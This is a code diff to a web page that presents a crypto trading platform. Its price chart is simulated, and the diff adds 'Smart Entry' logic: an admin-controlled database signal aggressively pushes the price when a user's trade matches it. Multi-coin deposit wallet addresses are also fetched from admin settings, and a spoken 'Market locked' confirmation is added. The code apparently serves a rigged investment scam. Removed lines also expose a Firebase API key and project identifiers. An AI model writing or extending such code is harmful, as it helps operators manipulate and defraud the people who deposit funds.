@@ -11,6 +11,7 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <!-- FIREBASE SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         :root {
@@ -1715,24 +1716,17 @@
             </div>
         </div>
 
+        <script src="js/firebase-config.js"></script>
         <script>
             // --- FIREBASE INIT ---
-            const firebaseConfig = {
-                apiKey: "AIzaSyBx4i-LJcCuYNWfYU_TfXA6_LXcY263RbA",
-                authDomain: "jay-shree-shyam0back.firebaseapp.com",
-                projectId: "jay-shree-shyam0back",
-                storageBucket: "jay-shree-shyam0back.firebasestorage.app",
-                messagingSenderId: "1084861244978",
-                appId: "1:1084861244978:web:192eb36bf370ffa60a3e2b",
-                measurementId: "G-WZVE9YYDGB"
-            };
-
             let db;
             let adminSignal = "NEUTRAL";
 
             try {
-                firebase.initializeApp(firebaseConfig);
-                db = firebase.database();
+                // Use shared init logic
+                const app = initFirebaseApp();
+                db = app.database();
+                const auth = app.auth();
 
                 // Listen for Admin Signals
                 db.ref('control/signal').on('value', (snap) => {
@@ -1741,12 +1735,21 @@
                     updateBotUI(adminSignal);
                 });
 
-                // Listen for Wallet Address
-                db.ref('settings/walletAddress').on('value', (snap) => {
-                    if (snap.val()) {
-                        walletAddresses['TRON'] = snap.val();
-                        if (document.getElementById('selectedNetworkDisplay').innerText.includes('TRON')) {
-                            document.getElementById('walletAddressDisplay').innerText = snap.val();
+                // Listen for Wallet Addresses
+                db.ref('settings/wallets').on('value', (snap) => {
+                    const wallets = snap.val();
+                    if (wallets) {
+                        if (wallets.TRON) walletAddresses['TRON'] = wallets.TRON;
+                        if (wallets.ETH) walletAddresses['ETH'] = wallets.ETH;
+                        if (wallets.BSC) walletAddresses['BSC'] = wallets.BSC;
+                        if (wallets.BTC) walletAddresses['BTC'] = wallets.BTC;
+
+                        // Smart UI Update: Refresh current display
+                        const currentLabel = document.getElementById('selectedNetworkDisplay').innerText;
+                        for (const [key, name] of Object.entries(networkNames)) {
+                            if (name === currentLabel) {
+                                document.getElementById('walletAddressDisplay').innerText = walletAddresses[key];
+                            }
                         }
                     }
                 });
@@ -1808,8 +1811,20 @@
                 timeMins: 1,
                 zoom: 1.5,
                 scrollX: 0,
-                isLuckyTime: false
+                scrollX: 0,
+                isLuckyTime: false,
+                isBoosted: false // New flag for smart entry
             };
+
+            // --- TTS VOICE ---
+            function speak(text) {
+                if ('speechSynthesis' in window) {
+                    const utterance = new SpeechSynthesisUtterance(text);
+                    utterance.rate = 1.0;
+                    utterance.pitch = 1.0;
+                    window.speechSynthesis.speak(utterance);
+                }
+            }
 
             // --- CLOCK ---
             function tick() {
@@ -1855,9 +1870,12 @@
                 const activeTrade = state.trades.find(t => t.active);
                 if (state.isLuckyTime && activeTrade) drift += (activeTrade.dir === 'UP' ? 0.6 : -0.6);
 
-                // --- ADMIN CONTROL ---
-                if (adminSignal === 'UP') drift += 1.5 + Math.random();
-                if (adminSignal === 'DOWN') drift -= 1.5 + Math.random();
+                // --- ADMIN CONTROL (Smart Entry) ---
+                // Only boost IF the user has actually placed the trade matching the signal
+                if (state.isBoosted && adminSignal !== 'NEUTRAL') {
+                    if (adminSignal === 'UP') drift += 2.0 + Math.random(); // Aggressive UP
+                    if (adminSignal === 'DOWN') drift -= 2.0 + Math.random(); // Aggressive DOWN
+                }
 
 
                 state.price += drift;
@@ -1983,6 +2001,14 @@
                 state.trades.push(t);
                 updateUI();
                 showToast('Trade Placed: ' + dir, 'info');
+
+                // --- SMART ENTRY LOGIC ---
+                speak("Trade confirmed. Market locked.");
+                if (dir === adminSignal) {
+                    state.isBoosted = true;
+                    console.log("🚀 SMART BOOST ACTIVATED");
+                }
+
                 renderHistory();
             }
 
@@ -1997,6 +2023,11 @@
                 }
                 updateUI();
                 renderHistory();
+
+                // Reset boost after trade resolves
+                if (state.trades.filter(t => t.active).length === 0) {
+                    state.isBoosted = false;
+                }
             }
 
             function renderHistory() {
